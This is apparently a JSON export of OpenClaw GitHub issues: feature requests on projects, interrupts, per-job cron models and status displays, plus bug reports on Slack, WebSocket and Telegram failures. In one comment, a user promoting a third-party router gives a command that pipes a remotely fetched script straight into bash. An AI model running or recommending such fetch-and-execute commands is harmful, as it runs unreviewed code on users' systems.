          "body": "<img width=\"738\" height=\"622\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/6b0b5a2c-8660-498f-9074-969bfc46532f\" />"
        }
      ]
    },
    {
      "number": 13676,
      "title": "Feature Request: First-class Projects in Gateway Dashboard (workspace + skill scoping + runtime constraints)",
      "body": "## Summary\nAdd a first-class **Project** concept to the Gateway/Control UI dashboard so users can manage real work as projects (not just ad-hoc sessions), with clear isolation boundaries and fast context switching.\n\nToday, users approximate this with folders + multiple sessions + manual conventions (SDD/TASKS/RUNBOOK) and/or separate agents. This works, but the dashboard cannot answer basic questions like “what projects exist, what's active, and what constraints apply?”\n\n## Motivation / Problem\nWhen working on multiple projects, switching context in the Control UI is awkward and easy to lose:\n- Sessions are a great primitive for conversation state, but they're not a durable *project* object (and UI/session-history behavior can make older threads hard to re-open).\n- Projects often need **stronger isolation** than sessions: project-scoped workspaces, project-scoped tools/skills, and project-scoped runtime constraints (host vs container-only vs node allowlist).\n\nUsers want a stable “home” for each project that persists across time, supports SDD/spec-first workflows, and prevents cross-project context/tool bleed.\n\n## Proposed Solution\nIntroduce a new top-level object: **Project**.\n\n### Core capabilities (MVP)\n1) **Projects list** in dashboard sidebar (or a Projects tab):\n   - name, description\n   - status (active/idle) and last activity timestamp\n   - links to project docs (SDD/TASKS/RUNBOOK)\n\n2) **Project ↔ session binding**\n   - each Project has a default “home session” (sessionKey/sessionId binding)\n   - allow optional additional “workstreams” (extra sessions) per project for multi-agent or research vs implementation\n\n3) **Project ↔ workspace binding**\n   - each Project points at one or more workspace paths (repo root)\n   - dashboard action: “Open project workspace” (file link / path display)\n\n4) **Project-scoped tools/skills (soft enforcement in MVP)**\n   - per-project allow/deny for skills/tools, or per-project agent profile\n\n5) **Project-scoped runtime constraints (soft enforcement in MVP)**\n   - host vs container-only vs node allowlist\n   - (MVP can start as warnings + conventions; future could be hard enforcement)\n\n### Suggested UX\n- “Create Project” wizard that asks: name, workspace path, preferred agent/model, optional docs scaffold, and constraints (container-only/node allowlist).\n- “Switch Project” opens the bound session and loads relevant docs.\n\n## Why this is not just sessions\nSessions model *conversation state*. Projects model *units of work + constraints + resources*. A project can have multiple sessions (workstreams) and can enforce scoping rules; sessions alone can't express that cleanly.\n\n## Related / Prior Art (research)\n- #13535 (Project-based agent shortcuts in dashboard sidebar) — similar motivation: persistent project sessions + fast context switching.\n- #7776 (Channel-aware memory context) — includes channel→project mapping / project namespaces idea.\n- #4575 (Sessions dropdown only shows current session after creating new session) — highlights UX risk when users treat sessions as projects.\n- #7056 (restrict operations to containers/VMs) — adjacent motivation for project/runtime boundaries.\n- #7575 (Sysbox runtime for secure container isolation) — relevant to stronger future enforcement.\n- #10004 (multi-agent isolation prerequisites) — related theme: isolation boundaries for real deployments.\n\n## Acceptance Criteria (MVP)\n- Dashboard shows a Projects list with at least: name, home session, workspace path, last activity.\n- One-click “Switch Project” returns you to that project's home session.\n- Project can declare tool/skill scope and runtime constraints (initially informational or warn-only).\n\n## Notes\nThis request aims to make OpenClaw usable for serious multi-project work with SDD/spec-first workflows and reduced context bleed, while laying a path toward stronger isolation primitives over time.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13676",
      "createdAt": "2026-02-10T21:05:34Z",
      "updatedAt": "2026-02-10T21:05:34Z",
      "author": "kundeng",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux",
          "docker"
        ],
        "components": [
          "gateway",
          "web-ui",
          "websocket"
        ]
      }
    },
    {
      "number": 13675,
      "title": "Feature Request: Mid-generation interrupt with prompt injection (like Claude Code Esc)",
      "body": "## Summary\nAdd the ability to interrupt an agent mid-generation and inject a corrective prompt, similar to how Claude Code allows pressing Esc to stop and continue with updated context.\n\n## Current Behavior\n- Messages queue while agent is busy\n- User must wait for full completion before corrections are seen\n- Wasted tokens when agent goes down wrong path\n\n## Proposed Behavior\n1. User sends a message while agent is generating\n2. User can trigger an **interrupt** (e.g., Telegram inline button, Discord reaction, or special prefix like `!stop`)\n3. Agent generation stops mid-stream\n4. User's correction/new info is appended to context\n5. Agent continues from where it left off with the new information\n\n## Benefits\n- **Token savings**: Stop wrong-path generation early\n- **Better UX**: Matches Claude Code terminal experience\n- **Faster iteration**: Course-correct without waiting\n\n## Implementation Ideas\n- **Telegram**: Inline button `[⏹ Interrupt]` shown during generation\n- **Discord**: React with ⏹️ to interrupt\n- **CLI**: Already has Esc (reference implementation)\n- **Gateway**: Catch interrupt signal, append queued message to context, resume agent\n\n## Use Case\n```\nUser: \"Deploy the app\"\nAgent: [starts deploying to wrong environment]\nUser: [interrupt] \"Wait - deploy to staging, not prod\"\nAgent: [stops, sees correction, deploys to staging]\n```\n\nFiled by an OpenClaw user via their agent 🤖",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13675",
      "createdAt": "2026-02-10T21:04:40Z",
      "updatedAt": "2026-02-10T21:04:40Z",
      "author": "onesam-jpg",
      "labels": [],
      "taxonomy": {
        "channels": [
          "telegram",
          "discord",
          "signal"
        ],
        "platforms": [],
        "components": [
          "gateway",
          "websocket"
        ]
      }
    },
    {
      "number": 13674,
      "title": "Slack dm.policy \"open\" without dm.allowFrom causes infinite gateway boot loop",
      "body": "**Version:** 2026.2.6-3\n\n**Description:**\nWhen configuring a Slack account with `dm.policy: \"open\"` but omitting `dm.allowFrom: [\"*\"]`, the gateway enters an infinite restart loop on boot. The process never becomes healthy — it just crashes and restarts endlessly.\n\n**Expected behavior:**\nEither:\n1. `dm.policy: \"open\"` should automatically imply `allowFrom: [\"*\"]` (since that is the only sensible interpretation), OR\n2. Config validation should reject this combination with a clear error message at startup instead of boot-looping\n\n**Steps to reproduce:**\n1. Add a Slack account with:\n```json\n{\n  \"dm\": {\n    \"policy\": \"open\"\n  }\n}\n```\n(Note: no `allowFrom` field)\n\n2. Restart gateway\n3. Gateway enters infinite boot loop\n\n**Fix:**\nAdding `\"allowFrom\": [\"*\"]` to the `dm` object resolves the issue:\n```json\n{\n  \"dm\": {\n    \"policy\": \"open\",\n    \"allowFrom\": [\"*\"]\n  }\n}\n```\n\n**Impact:** Requires SSH access to manually fix the config file. If running headless/remote, this is a significant recovery challenge. We hit this twice on separate Slack bot accounts.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13674",
      "createdAt": "2026-02-10T21:03:36Z",
      "updatedAt": "2026-02-10T21:03:36Z",
      "author": "jermccc",
      "labels": [],
      "taxonomy": {
        "channels": [
          "slack"
        ],
        "platforms": [],
        "components": [
          "gateway",
          "config"
        ]
      }
    },
    {
      "number": 10243,
      "title": "WebSocket maxPayload too low for image uploads in WebUI (512KB hardcoded)",
      "body": "## Description\n\nUploading an image in the WebUI chat causes a crash loop due to the WebSocket `maxPayload` being hardcoded at 512 KB. The HTTP API allows 2 MB payloads, but the WebSocket server rejects anything over 512 KB.\n\n## Steps to Reproduce\n\n1. Open WebUI chat (`/chat?session=agent:main:main`)\n2. Upload/paste a photo into the chat\n3. Gateway logs: `Max payload size exceeded`\n4. WebSocket disconnects (code 1006)\n5. UI enters infinite reconnect loop — each reconnect attempt loads chat history, gateway tags it as `slow consumer` (code 1008), disconnects immediately\n6. WebUI becomes unusable until gateway restart + new session\n\n## Expected Behavior\n\nImage uploads in WebUI should either:\n- Work within a reasonable size limit (at least matching the HTTP API's 2 MB limit)\n- Gracefully reject oversized payloads with a user-visible error instead of crashing the session\n\n## Root Cause\n\nIn `dist/gateway-cli-D_8miTjF.js`:\n\n```js\nconst MAX_PAYLOAD_BYTES = 512 * 1024; // line 4178\n// ...\nmaxPayload: MAX_PAYLOAD_BYTES // line 14461 (WS server) + line 15524 (extension relay)\n```\n\nThe `slow consumer` reconnect loop (line 12135) compounds the issue — once the session has a large chat history (~3 MB in my case), every reconnect attempt fails because the history payload overwhelms the client.\n\n## Suggested Fix\n\n1. Make `maxPayload` configurable via `openclaw.json` under `gateway` section (e.g. `gateway.maxPayload`)\n2. Increase the default to at least 2 MB to match the HTTP API limit\n3. Handle payload-exceeded errors gracefully in the WebUI (show error toast instead of triggering a reconnect loop)\n\n## Environment\n\n- **Version:** v2026.2.3-1\n- **OS:** Arch Linux (x86_64)\n- **Gateway mode:** systemd user service\n- **Session size at time of crash:** ~3.1 MB (624 messages)\n\n## Logs\n\n```\n2026-02-06T07:45:34.855Z [ws] error conn=a8b9ba6a… remote=127.0.0.1: Max payload size exceeded\n2026-02-06T07:45:34.858Z [ws] webchat disconnected code=1006 reason=n/a conn=a8b9ba6a…\n2026-02-06T07:45:35.664Z [ws] webchat connected conn=511a579f… remote=127.0.0.1\n2026-02-06T07:45:35.870Z [ws] webchat disconnected code=1008 reason=slow consumer conn=511a579f…\n# ... reconnect loop continues every ~1 second for 30+ attempts\n```",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/10243",
      "createdAt": "2026-02-06T07:50:30Z",
      "updatedAt": "2026-02-10T21:03:13Z",
      "author": "CamelSprout",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "web-ui",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3880699165,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10243#issuecomment-3880699165",
          "createdAt": "2026-02-10T21:03:13Z",
          "updatedAt": "2026-02-10T21:03:13Z",
          "author": "andydoucet",
          "body": "We hit the same issue independently. Our investigation found that **both** gateway-cli dist files contain the hardcoded limit:\n\n```js\nconst MAX_PAYLOAD_BYTES = 512 * 1024; // gateway-cli-DZge3TdL.js:4691 + gateway-cli-DqCmx-9c.js:4692\n```\n\nUsed at two points per file:\n- `maxPayload: MAX_PAYLOAD_BYTES` for the main WS server\n- `maxPayload: MAX_PAYLOAD_BYTES` for the extension relay WS\n\nMeanwhile, the **client-side** WebSocket in `net-CYzQzbew.js` uses `maxPayload: 25 * 1024 * 1024` (25MB), and the config schema already defines `maxPayload: Type.Integer({ minimum: 1 })` — so the plumbing for a config option is partially there.\n\n**Proposed solution:** Add `gateway.wsMaxPayload` (or `gateway.maxPayload`) to the config schema with a sensible default (e.g. 10MB), and wire it through to both WS server instantiations. Will submit a PR with this approach.\n\nAs a workaround, we built a [post-update patch script](https://gist.github.com/) that replaces the constant in the dist files and a macOS LaunchAgent that auto-applies it after `openclaw update`."
        }
      ]
    },
    {
      "number": 11826,
      "title": "Support payload.model override for per-job model selection",
      "body": "### Problem\n\nCron jobs cannot specify which model to use. All jobs use the global `agents.defaults.model` chain, forcing operators to choose between:\n- Expensive cloud models for ALL jobs (wasteful for simple tasks)\n- Cheap local models for ALL jobs (insufficient for complex tasks)\n\n### Evidence\n\nWhen attempting to set `payload.model` via `cron.update`, the schema rejects it:\n\n```\n[tools] cron failed: invalid cron.update params:\n  at /patch/payload: unexpected property 'model';\n  at /patch/payload: must match a schema in anyOf\n```\n\n### Inconsistency\n\nOther payload fields ARE supported and work correctly:\n- `payload.channel` - Routes to specific channel (tested working)\n- `payload.to` - Specifies recipient (tested working)\n- `payload.model` - **Rejected** (inconsistent with above)\n\n### Use Case\n\nA fleet operator running ~500 daily cron jobs wants to:\n\n| Job Type | Count | Optimal Model | Cost |\n|----------|-------|---------------|------|\n| Email triage (classification) | ~288 | Local qwen2.5:14b | $0 |\n| Price threshold checks | ~96 | Local qwen2.5:14b | $0 |\n| Human-facing alerts | ~100 | Local command-r:35b | $0 |\n| Complex synthesis (morning brief) | ~10 | Claude Opus | API cost |\n\n**Current behavior:** ALL 500 jobs use Claude Opus → ~$50-100/day\n**Desired behavior:** Per-job routing → ~$2-5/day (97% reduction)\n\n### Proposed Solution\n\nAdd optional `model` field to cron job payload schema:\n\n```typescript\n// src/cron/types.ts\ninterface CronPayload {\n  kind: \"agentTurn\";\n  message: string;\n  channel?: string;\n  to?: string;\n  model?: string;  // NEW: Optional model override\n  thinking?: string;\n  timeoutSeconds?: number;\n}\n```\n\nIn the cron runner (`src/cron/isolated-agent/run.ts`), resolve model:\n```typescript\nconst model = payload.model\n  ? resolveAllowedModelRef(cfg, payload.model)\n  : resolveDefaultModelForAgent(cfg, agentId);\n```\n\nThe allowlist validation in `model-selection.ts` already exists and should be reused.\n\n### Alternatives Considered\n\n1. **Dedicated cron agent** - Create separate agent with local model defaults\n   - Workaround, not a fix\n   - Adds operational complexity\n   - Still can't vary model per-job\n\n2. **Change global defaults** - Set local model as primary\n   - Affects ALL sessions (interactive + cron)\n   - Can't use expensive models for complex interactive work\n   - Breaks current architecture\n\n3. **Wrapper scripts bypass LLM** - Scripts send messages directly\n   - Loses LLM decision-making capability\n   - Only works for pure automation\n   - Defeats purpose of AI agent\n\n### Environment\n\n- **OpenClaw version:** 2026.2.6-3\n- **Affected component:** `src/cron/` (schema + runner)\n- **Related files:**\n  - `src/cron/types.ts` - Payload schema\n  - `src/cron/isolated-agent/run.ts` - Model resolution\n  - `src/agents/model-selection.ts` - Allowlist validation\n\n### Additional Context\n\nLog evidence showing the schema rejection (from `gateway.err`):\n```\n2026-02-07T16:31:16.XXX [tools] cron failed: invalid cron.update params:\n  at /patch/payload: unexpected property 'model';\n  at /patch/payload: must match a schema in anyOf\n```\n\nThis occurred 7 times when an agent attempted to configure job-level models.\n\nSuggested labels: enhancement, cron            \n",
      "state": "open",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/11826",
      "createdAt": "2026-02-08T11:33:39Z",
      "updatedAt": "2026-02-10T21:01:47Z",
      "author": "similar-bespoke",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "config"
        ]
      },
      "commentsData": [
        {
          "id": 3868575701,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11826#issuecomment-3868575701",
          "createdAt": "2026-02-08T23:45:11Z",
          "updatedAt": "2026-02-08T23:45:11Z",
          "author": "1bcMax",
          "body": "Strong +1 for per-job model selection. The 97% cost reduction estimate is real.\n\nWhile waiting for native `payload.model` support, you might find **ClawRouter** useful - it automatically routes based on task complexity analysis:\n\n- Email triage → classified as SIMPLE → routes to Haiku\n- Complex synthesis → classified as COMPLEX/REASONING → routes to Opus\n\nIt analyzes the message content using 14-dimension scoring (reasoning markers, multi-step patterns, etc.) in <1ms.\n\nFor your 500 daily cron jobs scenario, it would automatically route the classification/threshold tasks to cheaper models without needing per-job config.\n\nInstall:\n```bash\ncurl -fsSL https://raw.githubusercontent.com/BlockRunAI/ClawRouter/main/scripts/reinstall.sh | bash\n```\n\nGitHub: https://github.com/BlockRunAI/ClawRouter\n\nThat said, explicit `payload.model` override would still be valuable for cases where you KNOW a specific model is needed regardless of content analysis."
        },
        {
          "id": 3880346712,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11826#issuecomment-3880346712",
          "createdAt": "2026-02-10T19:49:36Z",
          "updatedAt": "2026-02-10T19:49:36Z",
          "author": "BigPotty",
          "body": "LOVE this. The ability to select models (especially if there is an option for LOCAL models in additional on online models) would be massive. As of now there is no way to do this. \n\n(I've been trying for the last week...)\n\nhttps://github.com/openclaw/openclaw/issues/11461\nhttps://github.com/openclaw/openclaw/issues/13159\n\nAnd alternatives like ClawRouter (from what I understand) do not allow for local models in addition to online models.\n\n"
        },
        {
          "id": 3880690908,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/11826#issuecomment-3880690908",
          "createdAt": "2026-02-10T21:01:47Z",
          "updatedAt": "2026-02-10T21:01:47Z",
          "author": "1bcMax",
          "body": "Hey @BigPotty! Quick clarification - ClawRouter does have a **free tier**:\n\n```\n/model free\n```\n\nThis routes to `gpt-oss-120b` - a 120B parameter model at **$0 cost**. Works well for simple tasks like classification, triage, formatting, etc.\n\nThe routing can automatically send simple requests to free/cheap models and only use expensive models when needed:\n\n| Tier | Model | Cost |\n|------|-------|------|\n| SIMPLE | gpt-oss-120b | **$0** |\n| MEDIUM | deepseek-chat | $0.27/M |\n| COMPLEX | gemini-2.5-pro | $10/M |\n| REASONING | deepseek-reasoner | $2.19/M |\n\nFor your 500 daily cron jobs, the simple classification tasks would hit the free tier automatically.\n\nHappy to help if you want to try it out!"
        }
      ]
    },
    {
      "number": 13673,
      "title": "[Feature]: 20:58:33 typing TTL reached (2m); stopping typing indicator",
      "body": "## Summary\n\nDescribe the problem you are trying to solve or the opportunity you see.\n\n## Proposed solution\n\nWhat would you like Clawdbot to do?\n\n## Alternatives considered\n\nAny other approaches you have considered?\n\n## Additional context\n\nLinks, screenshots, or related issues.\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13673",
      "createdAt": "2026-02-10T21:01:39Z",
      "updatedAt": "2026-02-10T21:01:39Z",
      "author": "braxton0054",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      }
    },
    {
      "number": 13601,
      "title": "Add persistent cron job execution history with filtering",
      "body": "## Problem\n\nCron job execution history is currently stored in-memory only, which means:\n\n- History is lost on gateway restart\n- No way to audit job executions over time\n- Can't filter by failure/success status\n- No historical analysis of job reliability\n- Debugging issues requires catching them in real-time\n\n## Why This Matters\n\n- **Debugging** — need historical data to diagnose intermittent issues\n- **Audit trails** — regulatory/compliance requirements need persistent logs\n- **Reliability tracking** — can't measure job success rate over time\n- **Root cause analysis** — \"did this job fail last week too?\"\n- **Production readiness** — in-memory logs aren't production-grade\n\n## Current Behavior\n\n```bash\n$ openclaw cron list\nID: daily-backup\nSchedule: 0 2 * * *\nNext Run: 2026-02-11 02:00\nLast 5 runs: [in-memory, lost on restart]\n```\n\n**Limitations:**\n- Only shows recent runs (limited by memory)\n- Restart = history gone\n- Can't filter by time range or status\n- No way to export for analysis\n\n## Proposed Solution\n\n### 1. Persistent Storage\n\nStore execution history in SQLite database or JSON log files:\n\n```typescript\ninterface CronExecutionRecord {\n  id: string;          // unique execution ID\n  jobId: string;       // which job ran\n  scheduledAt: number; // when it should have run\n  startedAt: number;   // actual start time\n  completedAt: number; // when it finished\n  status: 'success' | 'failed' | 'skipped' | 'timeout';\n  exitCode?: number;\n  output?: string;     // stdout/stderr\n  error?: string;      // error message if failed\n  duration: number;    // milliseconds\n}\n```\n\n**Storage location:** `~/.openclaw/cron-history.db` or `~/.openclaw/cron-history/`\n\n### 2. CLI Filtering\n\n```bash\n# Show all executions of a specific job\n$ openclaw cron logs <job-id>\n\n# Filter by status\n$ openclaw cron logs <job-id> --failed\n$ openclaw cron logs <job-id> --success\n\n# Filter by time range\n$ openclaw cron logs <job-id> --since \"2026-02-01\"\n$ openclaw cron logs <job-id> --since \"24h\"\n$ openclaw cron logs <job-id> --range \"2026-02-01\" \"2026-02-10\"\n\n# Show detailed output\n$ openclaw cron logs <job-id> --verbose\n\n# Export to JSON for analysis\n$ openclaw cron logs <job-id> --json > analysis.json\n\n# Tail live execution logs\n$ openclaw cron logs <job-id> --follow\n```\n\n### 3. Enhanced `cron list`\n\n```bash\n$ openclaw cron list\n\nID: daily-backup\nSchedule: 0 2 * * *\nNext Run: 2026-02-11 02:00:00 UTC\nLast Run: 2026-02-10 02:00:15 UTC (success, 45s)\nSuccess Rate: 98.5% (last 30 days)\nTotal Runs: 137\nFailed Runs: 2\n⚠️  Last failure: 2026-02-08 02:00:10 UTC (timeout after 5m)\n\nID: hourly-check\nSchedule: 0 * * * *\nNext Run: 2026-02-10 19:00:00 UTC\nLast Run: 2026-02-10 18:00:05 UTC (success, 2s)\nSuccess Rate: 100% (last 30 days)\nTotal Runs: 720\n```\n\n### 4. Retention Policy\n\n```bash\n# Config option for retention\n$ openclaw config set cron.historyRetentionDays 90\n\n# Manual cleanup\n$ openclaw cron history --prune --older-than 30d\n\n# Vacuum database\n$ openclaw cron history --vacuum\n```\n\n## Implementation Approach\n\n### Option A: SQLite Database (recommended)\n\n**Pros:**\n- Fast queries with indexes\n- Easy filtering and aggregation\n- Standard tooling (can query directly)\n- Handles concurrent writes\n\n**Schema:**\n```sql\nCREATE TABLE cron_executions (\n  id TEXT PRIMARY KEY,\n  job_id TEXT NOT NULL,\n  scheduled_at INTEGER NOT NULL,\n  started_at INTEGER NOT NULL,\n  completed_at INTEGER,\n  status TEXT NOT NULL,\n  exit_code INTEGER,\n  output TEXT,\n  error TEXT,\n  duration INTEGER,\n  INDEX idx_job_id (job_id),\n  INDEX idx_started_at (started_at),\n  INDEX idx_status (status)\n);\n```\n\n### Option B: JSON Log Files\n\n**Pros:**\n- Simple to implement\n- Human-readable\n- Easy to backup/sync\n\n**Cons:**\n- Slower queries\n- No built-in filtering\n- Need custom parsing logic\n\n**Format:** One JSONL file per job: `~/.openclaw/cron-history/<job-id>.jsonl`\n\n## Use Cases\n\n### Debugging intermittent failures:\n```bash\n$ openclaw cron logs daily-backup --failed --since 30d\n2026-01-15 02:00:10 UTC - failed (timeout after 5m)\n2026-02-08 02:00:10 UTC - failed (timeout after 5m)\n\n# Pattern: timeouts on the 8th/15th → disk full?\n```\n\n### Analyzing performance trends:\n```bash\n$ openclaw cron logs api-sync --json | jq '.[] | .duration' | stats\nMean: 2340ms\nP95: 4500ms\nP99: 8900ms\n```\n\n### Compliance audit:\n```bash\n$ openclaw cron logs security-scan --range \"2026-01-01\" \"2026-01-31\" --json\n# Export complete execution history for January\n```\n\n## Acceptance Criteria\n\n- [ ] Execution history persists across restarts\n- [ ] `openclaw cron logs <job-id>` shows execution history\n- [ ] Filtering by status (--failed, --success)\n- [ ] Filtering by time range (--since, --range)\n- [ ] JSON export (--json)\n- [ ] Success rate calculation\n- [ ] Configurable retention policy\n- [ ] Database/log pruning command\n- [ ] Performance: query 10k records in <100ms\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13601",
      "createdAt": "2026-02-10T18:55:51Z",
      "updatedAt": "2026-02-10T20:54:52Z",
      "author": "trevorgordon981",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13670,
      "title": "Add Model and Token Usage Status Display to Control UI Topbar",
      "body": "## Feature Request: Model and Token Usage Display in Control UI\n\n**Summary**: Add a real-time status display showing current model and token usage in the OpenClaw Control UI header/topbar.\n\n**Motivation**: \n- Users need quick visibility into which model is currently active\n- Token usage awareness helps with cost management and quota monitoring\n- Status information is already available via debug APIs but requires navigation to debug tab\n\n**Proposed Implementation**:\n\n### UI Changes\nAdd a status section to the topbar between existing left/right sections:\n\n```html\n<header class=\"topbar\">\n  <div class=\"topbar-left\">\n    <!-- existing nav controls -->\n  </div>\n  <div class=\"topbar-status\">\n    <div class=\"model-status\">\n      <span class=\"model-name\">${currentModel}</span>\n    </div>\n    <div class=\"token-status\">\n      <span class=\"token-usage\">${tokenUsed}/${tokenLimit} (${percentage}%)</span>\n    </div>\n  </div>\n  <div class=\"topbar-right\">\n    <!-- existing controls -->\n  </div>\n</header>\n```\n\n### Data Sources\nThe infrastructure already exists:\n- `debugModels` function provides model information\n- `debugStatus` function provides token usage data\n- Status polling is already implemented for debug tab\n\n### Styling\n```css\n.topbar-status {\n  display: flex;\n  align-items: center;\n  gap: 16px;\n  font-size: 12px;\n  color: var(--text-muted);\n}\n\n.model-status,\n.token-status {\n  padding: 4px 8px;\n  background: var(--bg-secondary);\n  border-radius: 4px;\n}\n```\n\n**User Story**: \nAs a user of OpenClaw, I want to see at-a-glance which model I'm using and my current token consumption so I can make informed decisions about my usage without navigating to the debug tab.\n\n**Technical Notes**:\n- Located in compiled bundle: `/dist/control-ui/assets/index-BeKTXH1m.js` around line 7494\n- Should integrate with existing polling mechanisms\n- Consider making display toggleable via settings\n\n**Priority**: Medium - QoL improvement that enhances user awareness\n\nRelated: This would complement the existing debug tab functionality without duplicating it.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13670",
      "createdAt": "2026-02-10T20:46:39Z",
      "updatedAt": "2026-02-10T20:46:39Z",
      "author": "RobbyMo81",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "web-ui"
        ]
      }
    },
    {
      "number": 13668,
      "title": "Antigravity provider still returns 'version no longer supported' after updating PI_AI_ANTIGRAVITY_VERSION",
      "body": "## Summary\nThe google-antigravity provider always replies with:\n\n> This version of Antigravity is no longer supported. Please update to receive the latest features!\n\nI tested multiple version strings (including the one suggested in #7308) and updated clawdbot via npm, but the response is unchanged.\n\n## Steps to Reproduce\n1. Configure model `google-antigravity/gemini-3-flash`.\n2. Set `PI_AI_ANTIGRAVITY_VERSION` to each of the following, restarting the gateway each time:\n   - `1.15.8`\n   - `1.16.5`\n   - `0.27.3` (Gemini CLI)\n   - `antigravity/1.16.5 darwin/arm64` (full UA string)\n3. Send any prompt (e.g., “Reply with exactly: OK”).\n\n## Actual Behavior\nThe response body is the error text above (no model output), every time.\n\n## Expected Behavior\nVersion should be accepted, or the provider should detect this as a failure and trigger fallback.\n\n## Environment\n- OpenClaw/Clawdbot: **2026.1.24-3** (npm i -g clawdbot@latest completed; version unchanged)\n- Node: **v24.13.0**\n- OS (container): **Debian 12 (bookworm)**\n- Host kernel: **Linux 6.8.0-86-generic x86_64**\n- Auth: **google-antigravity OAuth profile**\n\nRefs: #7308 (UA update suggestion)\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13668",
      "createdAt": "2026-02-10T20:44:53Z",
      "updatedAt": "2026-02-10T20:44:53Z",
      "author": "Beowulfwar",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux",
          "docker"
        ],
        "components": [
          "gateway",
          "config"
        ]
      }
    },
    {
      "number": 13667,
      "title": "[Bug]: Telegram plugin starts but never polls for updates (fetch failed)",
      "body": "# Bug Report: Telegram Plugin Fails to Poll for Updates\n\n**Version:** `2026.2.9`  \n**Platform:** macOS (Darwin 25.2.0, arm64)  \n**Node.js:** v22.22.0  \n**Date:** 2026-02-10\n\n---\n\n## Summary\n\nThe Telegram plugin starts successfully but **never enters its polling loop** to receive messages. The bot is accessible via direct API calls (curl, Node.js fetch), but OpenClaw's plugin fails with \"fetch failed\" errors during initialization and never polls for updates.\n\n---\n\n## Environment\n\n- **OpenClaw Version:** `2026.2.9`\n- **OS:** macOS (Darwin 25.2.0, arm64)\n- **Node.js:** v22.22.0\n- **Installation:** Homebrew (`/opt/homebrew/lib/node_modules/openclaw`)\n\n---\n\n## Reproduction Steps\n\n1. Configure Telegram bot in `openclaw.json`:\n```json\n{\n  \"channels\": {\n    \"telegram\": {\n      \"enabled\": true,\n      \"accounts\": {\n        \"default\": {\n          \"name\": \"MyBot\",\n          \"botToken\": \"1234567890:ABCdefGHIjklMNOpqrsTUVwxyz\",\n          \"dmPolicy\": \"allowlist\",\n          \"allowFrom\": [123456789]\n        }\n      }\n    }\n  },\n  \"plugins\": {\n    \"entries\": {\n      \"telegram\": {\n        \"enabled\": true\n      }\n    }\n  }\n}\nStart OpenClaw gateway\nSend a message to the bot on Telegram\nExpected: Bot receives and processes message\nActual: No response, no log entries for received messages\nObserved Behavior\nLogs show plugin starts but fails to initialize polling:\n{\"subsystem\":\"gateway/channels/telegram\",\"message\":\"[default] starting provider (@mybotusername)\",\"time\":\"2026-02-10T20:31:04.553Z\",\"level\":\"INFO\"}\n\n{\"subsystem\":\"gateway/channels/telegram\",\"message\":\"telegram setMyCommands failed: Network request for 'setMyCommands' failed!\",\"time\":\"2026-02-10T20:28:33.045Z\",\"level\":\"ERROR\"}\n\n{\"message\":\"Non-fatal unhandled rejection (continuing): TypeError: fetch failed\\n    at node:internal/deps/undici/undici:14902:13\",\"time\":\"2026-02-10T20:28:33.048Z\",\"level\":\"WARN\"}\nAfter the startup errors, no further Telegram-related logs appear — no polling activity, no update reception, complete silence.\n\nWhat Works (Network is Fine)\n✅ Direct curl to Telegram API works perfectly:\n$ curl -s https://api.telegram.org/bot<TOKEN>/getMe\n{\"ok\":true,\"result\":{\"id\":1234567890,\"is_bot\":true,\"first_name\":\"MyBot\",\"username\":\"mybotusername\",...}}\n✅ Node.js fetch works perfectly:\n$ node -e \"fetch('https://api.telegram.org/bot<TOKEN>/getMe').then(r => r.json()).then(console.log)\"\n{\"ok\":true,\"result\":{\"id\":1234567890,\"is_bot\":true,\"first_name\":\"MyBot\",...}}\n✅ Telegram's getUpdates endpoint is reachable:\n$ curl -s \"https://api.telegram.org/bot<TOKEN>/getUpdates?limit=1\"\n{\"ok\":true,\"result\":[]}\nConclusion: Network connectivity is perfect. DNS resolves correctly. TLS handshake works. The bot token is valid. The issue is inside OpenClaw's Telegram plugin.\n\nWhat We Tried\n✅ Fresh bot token — Created brand new bot via @BotFather, same issue\n✅ Disable/re-enable plugin — No change\n✅ Removed all secondary agents — Simplified to single-agent config, same issue\n✅ Gateway restarts — Multiple restarts, always same behavior\n✅ Different bot tokens (3 total) — All exhibit identical behavior\nExpected Behavior\nThe Telegram plugin should:\n\nStart successfully (✅ this works)\nCall setMyCommands (❌ fails with \"fetch failed\")\nEnter polling loop via getUpdates (❌ never happens)\nReceive and process incoming messages (❌ never happens)\nImpact\nCritical: Telegram is completely unusable. The plugin initializes but never actually connects to receive messages, rendering the channel non-functional.\n\nAdditional Context\niMessage plugin works perfectly on the same system\nThis was working previously (confirmed via message history)\nIssue appeared after config changes and gateway restarts\nTested with multiple different bot tokens (all valid, all fail identically)\nPossible Root Cause\nThe plugin appears to be using an internal fetch implementation that's failing (undici-based, from stack trace), while Node's global fetch works fine. Possible mismatch between undici version and Telegram API requirements, or proxy/TLS configuration issue 